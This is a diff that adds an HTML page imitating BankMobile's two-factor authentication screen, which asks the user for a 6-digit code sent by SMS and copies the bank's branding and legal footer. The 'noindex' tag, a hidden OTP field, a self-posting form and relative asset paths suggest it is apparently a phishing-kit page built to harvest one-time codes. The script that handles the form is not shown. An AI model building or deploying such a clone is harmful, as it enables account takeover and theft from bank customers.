@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex">
+    <title>BankMobile: Two Factor Authentication Verify</title>
+    
+    <link rel="stylesheet" href="css/global.css">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/outpages_index.css">
+    <link rel="stylesheet" href="css/2FAuthentication.css">
+    <link rel="stylesheet" href="css/micromodal.css">
+    
+    <style type="text/css">
+        .coloredBorder { border-color: #101a54; }
+    </style>
+</head>
+
+<body>
+    <div id="wrapper">
+        <div id="homepage-wrapper">
+            <div class="col-xs-12" id="resp-outheader">
+                <div class="hdr-logo-padding body-padding">
+                    <a href="https://vibeaccount.com/">
+                        <img src="images/higheru/title_1.gif" border="0" height="68" alt="BankMobile">
+                    </a>
+                </div>
+            </div>
+
+            <div class="row" style="margin-left:0;margin-right:0;">
+                <div class="outpagebody_div col-xs-12">
+                    <div class="outpagebody_pagecontent body-padding">
+                        <div class="pagebody_div">
+                            <div class="pagecontent_div">
+                                <div class="pagetitle"></div>
+
+                                <form name="auth_form" method="post" id="step-3" novalidate="novalidate">
+                                    <input type="text" name="otp" id="otp" hidden required>
+
+                                    <div class="container">
+                                        <div class="insides">
+                                            <div class="image"></div>
+                                            <div align="left">
+                                                <h1>
+                                                    We sent a secure code to your
+                                                    <strong>mobile phone</strong> ending in <strong id="phone-last4">4018</strong>
+                                                    Once you receive your code, enter it below.
+                                                </h1>
+                                            </div>
+                                            <br>
+                                            <div class="method">
+                                                <div align="center">
+                                                    <input type="text" id="twoFactAuthConfCode" size="18" maxlength="6" placeholder="Enter 6-digit code" inputmode="numeric">
+                                                </div>
+                                            </div>
+
+                                            <div class="login">
+                                                <div align="center">
+                                                    <input type="checkbox" name="saveDeviceCheckBox" value="on">
+                                                    Trust this computer.
+                                                    <a href="#" class="tooltip">
+                                                        <img src="images/css/icons/ico_tooltip.png" border="0" alt="Info">
+                                                        <span>You should only trust this computer if you log in from this device regularly, and trust everyone who uses it.</span>
+                                                    </a>
+                                                </div>
+                                            </div>
+
+                                            <div class="verifybuttons">
+                                                <div align="center">
+                                                    <input type="button" name="method" value="Go Back" class="cancel">
+                                                    <input type="submit" name="method" value="Submit">
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="col-xs-12 text-center" style="font-size: 11px; padding-top: 10px;">
+                                        1 message/request. To opt out, text STOP to 23951 or remove the mobile number from your profile. For help, text HELP to 23951.
+                                        Message and data rates may apply. Please see your mobile service provider for details.
+                                    </div>
+                                    <div class="col-xs-12 text-center" style="font-size: 11px; padding-top: 10px; padding-bottom: 10px;">
+                                        Please be advised that we do not guarantee the delivery of alerts. Receipt of alerts may be delayed or prevented by factor(s) affecting your mobile service provider and such other relevant entities.
+                                        Please review the <a href="https://firstcarolinabank.com/bmtechnologies/privacy-policy" target="_blank">Privacy Policy</a> and <a href="https://vibeaccount.com/info/accountagreements.do" target="_blank">Terms and Conditions</a>.
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="clear:both"></div>
+                </div>
+
+                <div class="pagefooter footertext">
+                    <a href="https://firstcarolinabank.com/bmtechnologies/privacy-policy" target="_blank">Privacy Statement</a> |
+                    <a href="https://firstcarolinabank.com/bmtechnologies/privacy-policy">Privacy Notice for California Residents</a>
+
+                    <div class="footertext footer_legaltext">
+                        <p><img src="images/footer/fdic-housing.png" alt="BM Technologies" class="fdic-logo"></p>
+
+                        © 2025 Powered by BM Technologies, Inc., a wholly owned subsidiary of First Carolina Bank, Member FDIC and Equal Housing Lender. All Rights Reserved.<br>
+                        <br>
+                        BankMobile banking products and banking services are provided by First Carolina Bank, Member FDIC &amp; Equal Housing Lender.
+                        The BankMobile Debit Mastercard® card is issued and administered by First Carolina Bank pursuant to license from Mastercard International Incorporated.
+                        Mastercard and the Mastercard brand mark are registered trademarks of Mastercard International Incorporated. All other names and logos are owned by their respective owners.<br>
+                        <br>
+                        BM Technologies, Inc., 171 North Winstead Avenue, Rocky Mount, NC 27804
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="speedbump-modal" class="modal micromodal-slide" aria-hidden="true">
+        <div class="modal__overlay" tabindex="-1" data-micromodal-close="">
+            <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="speed-bump-modal-title">
+                <header class="modal__header">
+                    <h3 class="modal__title" id="speed-bump-modal-title">
+                        External Site Notification
+                    </h3>
+                    <button class="modal__close" aria-label="Close modal" data-micromodal-close=""></button>
+                </header>
+                <main class="modal__content" id="speed-bump-modal-content">
+                    <p>You are leaving BM Technologies's web site and entering <span class="speedBumpCompanyNameLabel capitalized"></span>'s web site.</p>
+                    <p>While our intention in providing this link is to guide you to information or an opportunity from
+                        <span class="speedBumpCompanyNameLabel capitalized"></span>, we are required to inform you that
+                        we are not liable for any failure of products or services offered on <span class="speedBumpCompanyNameLabel capitalized"></span>'s site nor do we support or
+                        condone any opinions or comments expressed or shared on <span class="speedBumpCompanyNameLabel capitalized"></span>'s site. Furthermore, as our own
+                        privacy policy and security policy are not applicable to <span class="speedBumpCompanyNameLabel capitalized"></span>, we encourage you to seek out and read
+                        their policies.</p>
+                </main>
+                <footer class="modal__footer">
+                    <a href="javascript:void(0);" type="button" class="modal__btn modal__btn-primary" target="_blank" id="speedBumpLink">
+                        Go to <span class="speedBumpCompanyNameLabel"></span>
+                    </a>
+                    <button type="button" class="modal__btn modal__btn-tertiary" data-micromodal-close="" aria-label="Cancel">
+                        Cancel
+                    </button>
+                </footer>
+            </div>
+        </div>
+    </div>
+
+    <script type="text/javascript" src="js/forms.js"></script>
+</body>
+</html>
